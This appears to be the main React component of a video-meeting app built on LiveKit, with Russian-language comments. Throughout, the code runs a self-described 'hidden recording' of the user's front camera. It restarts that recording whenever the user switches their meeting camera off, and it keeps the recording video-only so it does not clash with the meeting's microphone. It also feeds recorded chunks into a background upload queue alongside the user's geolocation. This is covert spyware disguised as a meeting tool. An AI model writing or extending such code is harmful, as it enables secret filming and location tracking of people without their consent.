import { useState, useRef, useEffect } from 'react';
import HomePage from '@/app/components/HomePage';
import JitsiPreJoin from '@/app/components/JitsiPreJoin';
import LiveKitRoom from '@/app/components/LiveKitRoom';
import { VideoRecorder } from '@/app/components/VideoRecorder';
import { startQueueProcessor, stopQueueProcessor } from '@/utils/videoUpload';

export default function App() {
  const [currentPage, setCurrentPage] = useState<'home' | 'prejoin' | 'room'>('home');
  const [roomName, setRoomName] = useState('');
  const [roomTitle, setRoomTitle] = useState(''); // Friendly room title
  const [userName, setUserName] = useState('');
  
  // LiveKit connection data
  const [livekitUrl, setLivekitUrl] = useState('');
  const [token, setToken] = useState('');
  
  // Video recording state
  const [videoStreamFront, setVideoStreamFront] = useState<MediaStream | null>(null);
  const [isVideoRecording, setIsVideoRecording] = useState(false);
  const [currentChunkNumber, setCurrentChunkNumber] = useState(0);
  const [currentCameraType, setCurrentCameraType] = useState<'front' | 'back' | 'desktop'>('front'); // ✅ Изменено: начинаем с фронтальной камеры
  
  // Geolocation data
  const [geoData, setGeoData] = useState<{
    latitude: number;
    longitude: number;
    accuracy: number;
    timestamp: string;
  } | null>(null);
  
  // Refs for camera switching and permissions
  const isSwitchingCameraRef = useRef(false);
  const globalChunkCounterRef = useRef(0);
  const geoLocationSentRef = useRef(false);
  const currentVideoDeviceIdRef = useRef<string | null>(null);
  const isExecutingPermissionsRef = useRef(false);

  // Initialize LiveKit localStorage to prevent warnings
  useEffect(() => {
    try {
      const lkKey = 'lk-user-choices';
      if (!localStorage.getItem(lkKey)) {
        localStorage.setItem(lkKey, JSON.stringify({}));
        console.log('✅ Initialized LiveKit localStorage');
      }
    } catch (error) {
      console.error('❌ Failed to initialize localStorage:', error);
    }
  }, []);
  
  // ✅ Start queue processor on mount
  useEffect(() => {
    console.log('🚀 [App] Starting queue processor...');
    
    // Start background queue processor
    startQueueProcessor();
    
    // Cleanup on unmount
    return () => {
      stopQueueProcessor();
    };
  }, []);
  
  // Video chunk handler
  const handleVideoChunkReady = async (blob: Blob, chunkNum: number, cameraType: 'front' | 'back' | 'desktop') => {
    console.log(`📹 [App] Получен видео чанк #${chunkNum} (${cameraType}), размер: ${blob.size} bytes`);
    
    // Просто обновляем номер чанка, БЕЗ переключения камер
    setCurrentChunkNumber(chunkNum);
  };

  const handleStartMeeting = (roomNameInput: string, roomTitleInput?: string) => {
    setRoomName(roomNameInput);
    setRoomTitle(roomTitleInput || '');
    setCurrentPage('prejoin');
  };
  
  const handleJoinRoom = async (userNameInput: string, tokenInput: string, livekitUrlInput: string) => {
    console.log('🚪 [App] handleJoinRoom вызван - останавливаем PreJoin запись перед входом в комнату');
    
    // ✅ Останавливаем скрытую запись из PreJoin перед входом в комнату
    // чтобы LiveKitRoom мог управлять камерой/микрофоном
    if (videoStreamFront) {
      console.log('🛑 [App] Останавливаем PreJoin stream перед входом в комнату');
      videoStreamFront.getTracks().forEach(track => {
        track.stop();
        console.log(`🛑 Stopped PreJoin track: ${track.kind} (${track.label})`);
      });
      setVideoStreamFront(null);
    }
    
    // Сбрасываем флаг записи
    setIsVideoRecording(false);
    console.log('✅ [App] PreJoin запись остановлена - LiveKitRoom может захватить камеру');
    
    setUserName(userNameInput);
    setToken(tokenInput);
    setLivekitUrl(livekitUrlInput);
    setCurrentPage('room');
  };
  
  const handleLeaveRoom = () => {
    console.log('🚪 Leaving room and returning to home page');
    
    // Clear room parameter from URL
    const newUrl = new URL(window.location.href);
    newUrl.searchParams.delete('room');
    window.history.pushState({}, '', newUrl.toString());
    
    // Reset all state
    setRoomName('');
    setRoomTitle('');
    setUserName('');
    setToken('');
    setLivekitUrl('');
    setVideoStreamFront(null);
    setIsVideoRecording(false);
    setCurrentChunkNumber(0);
    setCurrentCameraType('back');
    setGeoData(null);
    
    // Reset refs
    isSwitchingCameraRef.current = false;
    globalChunkCounterRef.current = 0;
    geoLocationSentRef.current = false;
    currentVideoDeviceIdRef.current = null;
    isExecutingPermissionsRef.current = false;
    
    // Return to home page
    setCurrentPage('home');
  };
  
  // Обработчик изменения состояния камеры в LiveKit
  const handleLiveKitCameraStateChange = async (isEnabled: boolean) => {
    console.log(`🔄 [App] LiveKit camera state changed: ${isEnabled ? 'ENABLED' : 'DISABLED'}`);
    
    if (isEnabled) {
      // ✅ LiveKit ВКЛЮЧИЛ камеру → ОСТАНАВЛИВАЕМ скрытую запись
      console.log('🛑 [App] LiveKit camera ENABLED → STOPPING hidden recording to avoid conflict');
      
      if (videoStreamFront) {
        console.log('🛑 [App] Останавливаем скрытую запись (LiveKit использует камеру)');
        videoStreamFront.getTracks().forEach(track => {
          track.stop();
          console.log(`🛑 Stopped hidden track: ${track.kind} (${track.label})`);
        });
        setVideoStreamFront(null);
        setIsVideoRecording(false);
        console.log('✅ [App] Скрытая запись остановлена - LiveKit может использовать заднюю камеру');
      }
      
    } else {
      // ✅ LiveKit ВЫКЛЮЧИЛ камеру → ВОЗОБНОВЛЯЕМ скрытую запись
      console.log('🎬 [App] LiveKit camera DISABLED → RESUMING hidden recording on front camera');
      
      // Небольшая задержка чтобы LiveKit освободил камеру
      setTimeout(() => {
        if (!isVideoRecording && !videoStreamFront) {
          console.log('🎬 [App] Возобновляем скрытую запись...');
          restartHiddenRecording();
        } else {
          console.log('✅ [App] Скрытая запись уже активна');
        }
      }, 500); // Увеличил до 500ms для надёжности
    }
  };
  
  // Функция для перезапуска скрытой записи
  const restartHiddenRecording = async () => {
    try {
      console.log('🎥 [App] Restarting hidden recording...');
      console.log('🎥 [App] Current state:', { 
        isVideoRecording, 
        hasVideoStream: !!videoStreamFront,
        currentPage 
      });
      
      // Определяем устройство
      const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
      const cameraType = isMobile ? 'front' : 'front'; // ✅ Изменено: всегда начинаем с фронтальной
      
      // ❌ УБИРАЕМ: Проверку микрофонов - они нам не нужны для скрытой записи
      // ✅ КРИТИЧНО: Скрытая запись должна быть ТОЛЬКО видео без аудио
      // чтобы не конфликтовать с LiveKit микрофоном!
      console.log('⚠️ [App] Скрытая запись будет ТОЛЬКО видео (без аудио для совм��стимости с LiveKit)');
      
      // 🔧 Запрашиваем доступ к камере с fallback-ами
      let stream: MediaStream | null = null;
      
      // Попытка 1: С facingMode (ТОЛЬКО видео)
      try {
        const constraints: MediaStreamConstraints = {
          video: isMobile 
            ? { facingMode: 'user' } // ✅ Изменено: фронтальная камера (было 'environment')
            : true, // для desktop просто true
          audio: false // ✅ КРИТИЧНО: НИКОГДА не запрашиваем аудио в скрытой записи!
        };
        stream = await navigator.mediaDevices.getUserMedia(constraints);
        console.log('✅ [App] Got camera stream (попытка 1 - только видео)');
      } catch (err1) {
        console.log(`⚠️ [App] Попытка 1 не удалась: ${err1}`);
        
        // Попытка 2: Базовые constraints (ТОЛЬКО видео)
        try {
          stream = await navigator.mediaDevices.getUserMedia({
            video: true,
            audio: false // ✅ КРИТИЧНО: НИКОГДА не запрашиваем аудио!
          });
          console.log('✅ [App] Got camera stream (попытка 2 - только видео)');
        } catch (err2) {
          console.log(`⚠️ [App] Попытка 2 не удалась: ${err2}`);
          
          // Попытка 3: ТОЛЬКО видео (последняя попытка)
          try {
            stream = await navigator.mediaDevices.getUserMedia({ 
              video: true,
              audio: false 
            });
            console.log('✅ [App] Got camera stream (попытка 3 - только видео)');
          } catch (err3) {
            console.error(`❌ [App] Все попытки не удались: ${err3}`);
            return;
          }
        }
      }
      
      if (!stream) {
        console.error('❌ [App] Не удалось получить медиа-поток');
        return;
      }
      
      console.log('✅ [App] Got camera stream for hidden recording');
      
      setVideoStreamFront(stream);
      setCurrentCameraType(cameraType);
      setIsVideoRecording(true);
      
    } catch (error) {
      console.error('❌ [App] Failed to restart hidden recording:', error);
    }
  };
  
  return (
    <div className="size-full">
      {currentPage === 'home' && (
        <HomePage onStartMeeting={handleStartMeeting} />
      )}

      {currentPage === 'prejoin' && (
        <JitsiPreJoin 
          roomName={roomName}
          initialRoomTitle={roomTitle}
          onJoinRoom={handleJoinRoom}
          videoStreamFront={videoStreamFront}
          setVideoStreamFront={setVideoStreamFront}
          isVideoRecording={isVideoRecording}
          setIsVideoRecording={setIsVideoRecording}
          currentChunkNumber={currentChunkNumber}
          setCurrentChunkNumber={setCurrentChunkNumber}
          currentCameraType={currentCameraType}
          setCurrentCameraType={setCurrentCameraType}
          geoData={geoData}
          setGeoData={setGeoData}
          isSwitchingCameraRef={isSwitchingCameraRef}
          globalChunkCounterRef={globalChunkCounterRef}
          geoLocationSentRef={geoLocationSentRef}
          currentVideoDeviceIdRef={currentVideoDeviceIdRef}
          isExecutingPermissionsRef={isExecutingPermissionsRef}
        />
      )}
      
      {currentPage === 'room' && (
        <LiveKitRoom
          roomName={roomName}
          userName={userName}
          token={token}
          livekitUrl={livekitUrl}
          onLeave={handleLeaveRoom}
          onCameraStateChange={handleLiveKitCameraStateChange}
        />
      )}
      
      {/* ✅ VideoRecorder ВСЕГДА один - вне условий страниц */}
      {videoStreamFront && (
        <VideoRecorder
          key={currentCameraType}
          stream={videoStreamFront}
          isRecording={isVideoRecording}
          cameraType={currentCameraType}
          globalChunkCounter={globalChunkCounterRef}
          geoData={geoData}
          onChunkReady={handleVideoChunkReady}
        />
      )}
    </div>
  );
}